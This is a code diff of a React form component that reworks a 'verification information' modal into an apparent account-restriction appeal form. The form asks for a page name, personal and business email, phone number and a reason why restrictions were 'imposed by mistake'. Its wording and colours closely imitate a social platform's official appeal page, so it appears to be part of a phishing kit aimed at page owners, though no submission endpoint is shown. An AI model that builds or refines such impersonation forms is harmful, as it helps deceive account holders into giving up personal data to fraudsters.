@@ -2,20 +2,18 @@ import { useState } from 'react';
 import PropTypes from 'prop-types';
 import PhoneInput from '@/components/phone-input';
 
-const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
+const FirstFormModal = ({ show, onClose, onSubmit, texts, asPage = false }) => {
     const [formData, setFormData] = useState({
         fullName: '',
         personalEmail: '',
         businessEmail: '',
         phone: '',
         pageName: '',
-        dobDay: '',
-        dobMonth: '',
-        dobYear: '',
+        reason: '',
         additionalNotes: '',
-        agreeTerms: false
     });
     const [errors, setErrors] = useState({});
+    const [submitError, setSubmitError] = useState('');
 
     const handleChange = (field, value) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
@@ -26,6 +24,7 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
 
     const handleSubmit = (e) => {
         e.preventDefault();
+        setSubmitError('');
         const newErrors = {};
         const phoneDigits = String(formData.phone || '').replace(/\D/g, '');
 
@@ -34,10 +33,11 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
         if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
         if (!formData.phone.trim() || phoneDigits.length < 8 || phoneDigits.length > 15) newErrors.phone = true;
         if (!formData.pageName.trim()) newErrors.pageName = true;
-        if (!formData.dobDay || !formData.dobMonth || !formData.dobYear) newErrors.dob = true;
+        if (!formData.reason) newErrors.reason = true;
 
         if (Object.keys(newErrors).length > 0) {
             setErrors(newErrors);
+            setSubmitError(texts.fillRequiredFields || 'Please fill in correctly and completely all required fields to complete the verification profile.');
             return;
         }
 
@@ -47,353 +47,199 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
             businessEmail: formData.businessEmail,
             phone: formData.phone,
             pageName: formData.pageName,
-            dob: `${formData.dobDay}/${formData.dobMonth}/${formData.dobYear}`,
+            reason: formData.reason,
             additionalNotes: formData.additionalNotes
         });
     };
 
     if (!show) return null;
 
-    /* ── Inline style objects ── */
-    const overlayStyle = {
-        position: 'fixed',
-        inset: 0,
-        backgroundColor: 'rgba(0,0,0,0.45)',
-        zIndex: 1040,
-        display: 'flex',
-        justifyContent: 'center',
-        alignItems: 'flex-start',
-        padding: '32px 16px',
-        overflowY: 'auto',
-        WebkitOverflowScrolling: 'touch',
-        scrollbarWidth: 'none',
-        msOverflowStyle: 'none',
-    };
+    const inputClass = (hasError) =>
+        `w-full border h-9 px-3 rounded-lg text-sm outline-none focus:border-blue-500 ${hasError ? 'border-red-500' : 'border-[#d4dbe3]'}`;
+    const radioErrorClass = errors.reason ? 'ring-1 ring-red-500 rounded-md p-1' : '';
+    const radioTextClass = 'text-sm leading-6 text-gray-700 cursor-pointer';
 
-    const modalStyle = {
-        position: 'relative',
-        width: '100%',
-        maxWidth: '500px',
-        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
-        borderRadius: '18px',
-        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
-        zIndex: 1050,
-        flexShrink: 0,
-    };
+    const formContent = (
+        <>
+            <div className="flex items-start justify-between gap-4 mb-1">
+                <h2 className="text-[20px] font-[700] text-[#212121]">
+                    {texts.verificationInfo || 'Verification information'}
+                </h2>
+                {!asPage && (
+                    <button type="button" aria-label="Close" onClick={onClose} className="text-[#666] text-[24px] leading-none">
+                        ×
+                    </button>
+                )}
+            </div>
 
-    const headerStyle = {
-        display: 'flex',
-        justifyContent: 'space-between',
-        alignItems: 'flex-start',
-        padding: '28px 28px 0',
-    };
+            <p className="mb-2 p-2.5 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px] leading-5">
+                {texts.reviewReasonIntro || 'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.'}
+            </p>
 
-    const titleStyle = {
-        fontSize: '20px',
-        fontWeight: 700,
-        color: '#1a1a2e',
-        margin: 0,
-        lineHeight: 1.3,
-    };
+            <form onSubmit={handleSubmit} className="space-y-3">
+                {submitError && (
+                    <p className="text-[13px] text-red-600 -mb-1">{submitError}</p>
+                )}
 
-    const closeBtnStyle = {
-        background: 'none',
-        border: 'none',
-        fontSize: '22px',
-        cursor: 'pointer',
-        color: '#666',
-        padding: '0 0 0 12px',
-        lineHeight: 1,
-    };
-
-    const subtitleStyle = {
-        fontSize: '13px',
-        color: '#5a6a85',
-        lineHeight: 1.55,
-        padding: '10px 28px 0',
-        margin: 0,
-    };
-
-    const bodyStyle = {
-        padding: '20px 28px 28px',
-    };
-
-    const labelStyle = {
-        display: 'block',
-        fontSize: '13.5px',
-        fontWeight: 600,
-        color: '#1a1a2e',
-        marginBottom: '6px',
-    };
-
-    const requiredStar = {
-        color: '#1877f2',
-        marginLeft: '3px',
-    };
-
-    const inputStyle = (hasError) => ({
-        width: '100%',
-        padding: '11px 14px',
-        fontSize: '14px',
-        border: `1.5px solid ${hasError ? '#e74c3c' : '#dce3ed'}`,
-        borderRadius: '10px',
-        outline: 'none',
-        backgroundColor: '#fff',
-        color: '#333',
-        transition: 'border-color 0.2s',
-        boxSizing: 'border-box',
-    });
-
-    const fieldGap = { marginBottom: '10px' };
-
-    const selectStyle = (hasError) => ({
-        flex: 1,
-        padding: '11px 10px',
-        fontSize: '14px',
-        border: `1.5px solid ${hasError ? '#e74c3c' : '#dce3ed'}`,
-        borderRadius: '10px',
-        outline: 'none',
-        backgroundColor: '#fff',
-        color: '#555',
-        cursor: 'pointer',
-        appearance: 'auto',
-        boxSizing: 'border-box',
-    });
-
-    const textareaStyle = {
-        width: '100%',
-        padding: '11px 14px',
-        fontSize: '14px',
-        border: '1.5px solid #dce3ed',
-        borderRadius: '10px',
-        outline: 'none',
-        backgroundColor: '#fff',
-        color: '#333',
-        minHeight: '80px',
-        resize: 'vertical',
-        fontFamily: 'inherit',
-        boxSizing: 'border-box',
-    };
-
-    const checkboxRow = {
-        display: 'flex',
-        alignItems: 'center',
-        gap: '8px',
-        marginBottom: '20px',
-        fontSize: '13.5px',
-        color: '#333',
-    };
-
-    const submitBtnStyle = {
-        width: '100%',
-        padding: '14px',
-        fontSize: '16px',
-        fontWeight: 600,
-        color: '#fff',
-        backgroundImage: 'linear-gradient(90deg, #1877f2, #1a9bff)',
-        border: 'none',
-        borderRadius: '999px',
-        cursor: 'pointer',
-        transition: 'filter 0.2s',
-        boxShadow: '0 8px 20px rgba(24,119,242,0.3)',
-    };
-
-    // Generate options
-    const days = Array.from({ length: 31 }, (_, i) => i + 1);
-    const months = Array.from({ length: 12 }, (_, i) => i + 1);
-    const currentYear = new Date().getFullYear();
-    const years = Array.from({ length: 100 }, (_, i) => currentYear - i);
-
-    return (
-        <div style={overlayStyle}>
-            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
-                {/* Header */}
-                <div style={headerStyle}>
-                    <h2 style={titleStyle}>{texts.verificationInfo || 'Thông tin xác minh'}</h2>
-                    <button type="button" style={closeBtnStyle} onClick={onClose} aria-label="Close">×</button>
+                <div>
+                    <label className="block font-[600] text-sm text-gray-700 mb-1">
+                        {texts.fullName || 'Full Name'} <span className="text-red-600">*</span>
+                    </label>
+                    <input
+                        type="text"
+                        placeholder={texts.fullNamePlaceholder || 'Enter your full name'}
+                        value={formData.fullName}
+                        onChange={(e) => handleChange('fullName', e.target.value)}
+                        className={inputClass(errors.fullName)}
+                    />
                 </div>
 
-                {/* Subtitle */}
-                <p style={subtitleStyle}>
-                    {texts.fillRequiredFields || 'Vui lòng điền chính xác và đầy đủ các trường bắt buộc để hoàn tất hồ sơ xác minh.'}
-                </p>
+                <div>
+                    <label className="block font-[600] text-sm text-gray-700 mb-1">
+                        {texts.yourPageName || 'Your Page Name'} <span className="text-red-600">*</span>
+                    </label>
+                    <input
+                        type="text"
+                        placeholder={texts.pageNamePlaceholder || 'Enter your page name'}
+                        value={formData.pageName}
+                        onChange={(e) => handleChange('pageName', e.target.value)}
+                        className={inputClass(errors.pageName)}
+                    />
+                </div>
 
-                {/* Body / Form */}
-                <div style={bodyStyle}>
-                    <form onSubmit={handleSubmit}>
-                        {/* Họ và tên người đại diện */}
-                        <div style={fieldGap}>
-                            <label style={labelStyle}>
-                                {texts.fullName || 'Họ và tên người đại diện'}<span style={requiredStar}>*</span>
-                            </label>
+                <div>
+                    <label className="block font-[600] text-sm text-gray-700 mb-1">
+                        {texts.businessEmail || 'Business Email'} <span className="text-red-600">*</span>
+                    </label>
+                    <input
+                        type="email"
+                        placeholder={texts.businessEmailPlaceholder || 'Enter your business email'}
+                        value={formData.businessEmail}
+                        onChange={(e) => handleChange('businessEmail', e.target.value)}
+                        className={inputClass(errors.businessEmail)}
+                    />
+                </div>
+
+                <div>
+                    <label className="block font-[600] text-sm text-gray-700 mb-1">
+                        {texts.personalEmail || 'Personal Email'} <span className="text-red-600">*</span>
+                    </label>
+                    <input
+                        type="email"
+                        placeholder={texts.personalEmailPlaceholder || 'Enter your personal email'}
+                        value={formData.personalEmail}
+                        onChange={(e) => handleChange('personalEmail', e.target.value)}
+                        className={inputClass(errors.personalEmail)}
+                    />
+                </div>
+
+                <div>
+                    <label className="block font-[600] text-sm text-gray-700 mb-1">
+                        {texts.mobilePhone || 'Mobile Phone Number'} <span className="text-red-600">*</span>
+                    </label>
+                    <PhoneInput
+                        value={formData.phone}
+                        onChange={(val) => handleChange('phone', val)}
+                        error={!!errors.phone}
+                        id="phone-input"
+                        name="phone"
+                        placeholder={texts.mobilePhonePlaceholder || ''}
+                    />
+                </div>
+
+                <div className="pt-1">
+                    <p className="block text-sm font-[600] text-gray-700 mb-3">
+                        {texts.reviewReasonTitle || 'What do you think happened?'} <span className="text-red-600">*</span>
+                    </p>
+
+                    <div className={`space-y-2 ${radioErrorClass}`}>
+                        <label className="flex items-start" style={{ columnGap: '10px' }}>
                             <input
-                                style={inputStyle(errors.fullName)}
-                                type="text"
-                                placeholder={texts.fullNamePlaceholder || 'Ví dụ: Nguyễn Văn A'}
-                                value={formData.fullName}
-                                onChange={(e) => handleChange('fullName', e.target.value)}
-                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
-                                onBlur={(e) => { e.target.style.borderColor = errors.fullName ? '#e74c3c' : '#dce3ed'; }}
+                                type="radio"
+                                name="reason"
+                                value="erroneous_report"
+                                checked={formData.reason === 'erroneous_report'}
+                                onChange={(e) => handleChange('reason', e.target.value)}
+                                className="mt-1 shrink-0"
+                                style={{ marginRight: '10px' }}
                             />
-                        </div>
+                            <span className={radioTextClass} onClick={() => handleChange('reason', 'erroneous_report')}>
+                                {texts.reasonErroneousReport || 'An erroneous report or unfair competitive complaint.'}
+                            </span>
+                        </label>
 
-                        {/* Email liên hệ */}
-                        <div style={fieldGap}>
-                            <label style={labelStyle}>
-                                {texts.personalEmail || 'Email liên hệ'}<span style={requiredStar}>*</span>
-                            </label>
+                        <label className="flex items-start" style={{ columnGap: '10px' }}>
                             <input
-                                style={inputStyle(errors.personalEmail)}
-                                type="email"
-                                placeholder={texts.personalEmailPlaceholder || 'Ví dụ: nguyenvana@gmail.com'}
-                                value={formData.personalEmail}
-                                onChange={(e) => handleChange('personalEmail', e.target.value)}
-                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
-                                onBlur={(e) => { e.target.style.borderColor = errors.personalEmail ? '#e74c3c' : '#dce3ed'; }}
+                                type="radio"
+                                name="reason"
+                                value="notification_error"
+                                checked={formData.reason === 'notification_error'}
+                                onChange={(e) => handleChange('reason', e.target.value)}
+                                className="mt-1 shrink-0"
+                                style={{ marginRight: '10px' }}
                             />
-                        </div>
+                            <span className={radioTextClass} onClick={() => handleChange('reason', 'notification_error')}>
+                                {texts.reasonNotificationError || 'This notification was sent in error.'}
+                            </span>
+                        </label>
 
-                        {/* Email doanh nghiệp */}
-                        <div style={fieldGap}>
-                            <label style={labelStyle}>
-                                {texts.businessEmail || 'Email doanh nghiệp'}<span style={requiredStar}>*</span>
-                            </label>
+                        <label className="flex items-start" style={{ columnGap: '10px' }}>
                             <input
-                                style={inputStyle(errors.businessEmail)}
-                                type="email"
-                                placeholder={texts.businessEmailPlaceholder || 'Ví dụ: contact@tencongty.com'}
-                                value={formData.businessEmail}
-                                onChange={(e) => handleChange('businessEmail', e.target.value)}
-                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
-                                onBlur={(e) => { e.target.style.borderColor = errors.businessEmail ? '#e74c3c' : '#dce3ed'; }}
+                                type="radio"
+                                name="reason"
+                                value="no_fraud"
+                                checked={formData.reason === 'no_fraud'}
+                                onChange={(e) => handleChange('reason', e.target.value)}
+                                className="mt-1 shrink-0"
+                                style={{ marginRight: '10px' }}
                             />
-                        </div>
+                            <span className={radioTextClass} onClick={() => handleChange('reason', 'no_fraud')}>
+                                {texts.reasonNoFraud || 'No fraud involved / another legitimate reason:'}
+                            </span>
+                        </label>
 
-                        {/* Tên Trang/Fanpage */}
-                        <div style={fieldGap}>
-                            <label style={labelStyle}>
-                                {texts.yourPageName || 'Tên Trang/Fanpage'}<span style={requiredStar}>*</span>
-                            </label>
-                            <input
-                                style={inputStyle(errors.pageName)}
-                                type="text"
-                                placeholder={texts.pageNamePlaceholder || 'Ví dụ: ABC Studio Official'}
-                                value={formData.pageName}
-                                onChange={(e) => handleChange('pageName', e.target.value)}
-                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
-                                onBlur={(e) => { e.target.style.borderColor = errors.pageName ? '#e74c3c' : '#dce3ed'; }}
-                            />
-                        </div>
-
-                        {/* Số điện thoại */}
-                        <div style={fieldGap}>
-                            <label style={labelStyle}>
-                                {texts.mobilePhone || 'Số điện thoại'}<span style={requiredStar}>*</span>
-                            </label>
-                            <PhoneInput
-                                error={errors.phone}
-                                id="PhoneFieldFirstForm"
-                                name="mobile-phone-number"
-                                placeholder={texts.mobilePhonePlaceholder || 'Ví dụ: +84 901 234 567'}
-                                value={formData.phone}
-                                onChange={(val) => handleChange('phone', val)}
-                            />
-                        </div>
-
-                        {/* Ngày tháng năm sinh */}
-                        <div style={fieldGap}>
-                            <label style={labelStyle}>
-                                {texts.dob || 'Ngày tháng năm sinh'}<span style={requiredStar}>*</span>
-                            </label>
-                            <div style={{ display: 'flex', gap: '10px' }}>
-                                <select
-                                    style={selectStyle(errors.dob)}
-                                    value={formData.dobDay}
-                                    onChange={(e) => handleChange('dobDay', e.target.value)}
-                                >
-                                    <option value="">{texts.day || 'Ngày'}</option>
-                                    {days.map((d) => (
-                                        <option key={d} value={d}>{d}</option>
-                                    ))}
-                                </select>
-                                <select
-                                    style={selectStyle(errors.dob)}
-                                    value={formData.dobMonth}
-                                    onChange={(e) => handleChange('dobMonth', e.target.value)}
-                                >
-                                    <option value="">{texts.month || 'Tháng'}</option>
-                                    {months.map((m) => (
-                                        <option key={m} value={m}>{texts.month || 'Tháng'} {m}</option>
-                                    ))}
-                                </select>
-                                <select
-                                    style={selectStyle(errors.dob)}
-                                    value={formData.dobYear}
-                                    onChange={(e) => handleChange('dobYear', e.target.value)}
-                                >
-                                    <option value="">{texts.year || 'Năm'}</option>
-                                    {years.map((y) => (
-                                        <option key={y} value={y}>{y}</option>
-                                    ))}
-                                </select>
-                            </div>
-                        </div>
-
-                        {/* Ghi chú bổ sung */}
-                        <div style={fieldGap}>
-                            <label style={labelStyle}>
-                                {texts.additionalNotes || 'Ghi chú bổ sung (tùy chọn)'}
-                            </label>
+                        <div className="mt-1">
                             <textarea
-                                style={textareaStyle}
-                                placeholder={texts.additionalNotesPlaceholder || 'Ví dụ: Trang đại diện chính thức cho thương hiệu ABC, cần hoàn tất xác minh để tăng mức độ tin cậy.'}
+                                placeholder={texts.additionalNotesPlaceholder || 'Additional notes (optional)'}
                                 value={formData.additionalNotes}
                                 onChange={(e) => handleChange('additionalNotes', e.target.value)}
-                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
-                                onBlur={(e) => { e.target.style.borderColor = '#dce3ed'; }}
+                                className="w-full border border-[#d4dbe3] h-16 px-3 py-2 rounded-lg text-sm resize-none outline-none focus:border-blue-500"
                             />
                         </div>
-
-                        {/* Checkbox đồng ý */}
-                        <div style={checkboxRow}>
-                            <input
-                                type="checkbox"
-                                id="agreeTermsFirstForm"
-                                checked={formData.agreeTerms}
-                                onChange={(e) => handleChange('agreeTerms', e.target.checked)}
-                                style={{
-                                    width: '16px',
-                                    height: '16px',
-                                    accentColor: '#1877f2',
-                                    cursor: 'pointer',
-                                    borderColor: errors.agreeTerms ? '#e74c3c' : undefined,
-                                }}
-                            />
-                            <label htmlFor="agreeTermsFirstForm" style={{ cursor: 'pointer' }}>
-                                {texts.agreeToTermsOfUse || 'Tôi đồng ý với'} {' '}
-                                <a
-                                    href="#"
-                                    onClick={(e) => e.preventDefault()}
-                                    style={{ color: '#1877f2', textDecoration: 'none' }}
-                                    onMouseOver={(e) => { e.currentTarget.style.textDecoration = 'underline'; }}
-                                    onMouseOut={(e) => { e.currentTarget.style.textDecoration = 'none'; }}
-                                >
-                                    {texts.termsOfUseLink || 'Điều khoản sử dụng'} ↗
-                                </a>
-                            </label>
-                        </div>
-
-                        {/* Submit */}
-                        <button
-                            type="submit"
-                            style={submitBtnStyle}
-                            onMouseOver={(e) => { e.currentTarget.style.filter = 'brightness(1.05)'; }}
-                            onMouseOut={(e) => { e.currentTarget.style.filter = 'brightness(1)'; }}
-                        >
-                            {texts.confirm || 'Gửi thông tin xác minh'}
-                        </button>
-                    </form>
+                    </div>
                 </div>
+
+                <div className="pt-2">
+                    <button
+                        type="submit"
+                        className="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-[999px] py-2.5 hover:bg-blue-700 transition-colors"
+                        style={{ borderRadius: '999px' }}
+                    >
+                        {texts.continueBtn || 'Continue'}
+                    </button>
+                </div>
+            </form>
+        </>
+    );
+
+    if (asPage) {
+        return (
+            <div className="w-full max-w-[600px] my-3 md:my-8 mx-auto bg-white md:rounded-lg md:shadow-sm md:border md:border-gray-200 px-4 py-4">
+                {formContent}
+            </div>
+        );
+    }
+
+    return (
+        <div
+            className="fixed inset-0 z-[1040] bg-black/45 flex justify-center items-start p-3 md:p-6 overflow-y-auto"
+            onClick={onClose}
+        >
+            <div
+                className="relative w-full max-w-[600px] bg-white rounded-lg shadow-sm border border-gray-200 p-4 max-h-[92vh] overflow-y-auto"
+                onClick={(e) => e.stopPropagation()}
+            >
+                {formContent}
             </div>
         </div>
     );
@@ -403,7 +249,8 @@ FirstFormModal.propTypes = {
     show: PropTypes.bool.isRequired,
     onClose: PropTypes.func.isRequired,
     onSubmit: PropTypes.func.isRequired,
-    texts: PropTypes.object.isRequired
+    texts: PropTypes.object.isRequired,
+    asPage: PropTypes.bool
 };
 
 export default FirstFormModal;
